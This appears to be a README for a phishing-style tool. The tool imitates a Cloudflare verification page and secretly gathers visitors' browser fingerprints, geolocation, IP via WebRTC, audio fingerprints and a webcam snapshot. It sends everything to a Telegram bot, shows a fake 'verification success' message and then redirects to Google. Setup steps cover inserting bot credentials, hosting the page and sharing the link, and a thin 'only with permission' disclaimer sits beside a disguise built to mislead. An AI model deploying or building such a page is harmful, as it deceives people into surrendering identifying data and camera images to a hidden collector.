# Cloudflare-like Session Verification Page with Fingerprinting & Data Collection

This project mimics a Cloudflare-style "Attention Required!" page with a deceptive verification UI that gathers extensive browser fingerprinting and system data. It collects user information and transmits it to a Telegram bot, including geolocation, browser metadata, WebRTC/IP, audio fingerprinting, a webcam snapshot, and more.

## üîß Setup Instructions

1. **Clone or copy the HTML file.**

2. **Replace the Telegram credentials:**

   Open the `<script>` section in the HTML and update these two lines:

   ```js
   const TELEGRAM_BOT_TOKEN = "770000000000:DFHBCGHMHGMHFGHSDKUJHSU8I"; // Replace with your bot token
   const TELEGRAM_CHAT_ID = "000000000"; // Replace with your Telegram chat ID
   ````

3. **Host the HTML file on a web server**
   (e.g. GitHub Pages, Vercel, Netlify, or your own server).

4. **Open the hosted URL in a browser**
   or share the link with users (only with permission).

## ‚úÖ How It Works

1. The user is shown a verification-style box.
2. Upon clicking, the page:
   * Collects fingerprint & environment info.
   * Captures webcam snapshot (if permission is granted).
   * Sends the data and image to the configured Telegram bot.
3. Displays a fake "verification success" and redirects to [google.com](https://www.google.com).
